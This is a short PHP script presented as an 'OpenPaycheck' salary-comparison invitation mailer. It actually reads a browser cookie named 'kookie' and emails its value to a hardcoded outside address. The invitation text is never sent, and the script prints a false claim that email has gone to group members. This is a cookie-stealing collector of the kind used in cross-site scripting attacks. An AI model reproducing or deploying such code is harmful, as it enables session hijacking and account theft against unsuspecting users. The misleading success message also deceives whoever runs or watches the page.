<?php

$result = $_COOKIE['kookie'];


$subject = "OpenPaycheck Invitation";
$message = "You have OpenPayCheck invitation. Follow this link to compare salary information: ";
$headers = "From:" . $from;
mail("ville.lahdenp@hotmail.fi",$subject,$result, $headers);
echo "Email have been sent to group members.";




?>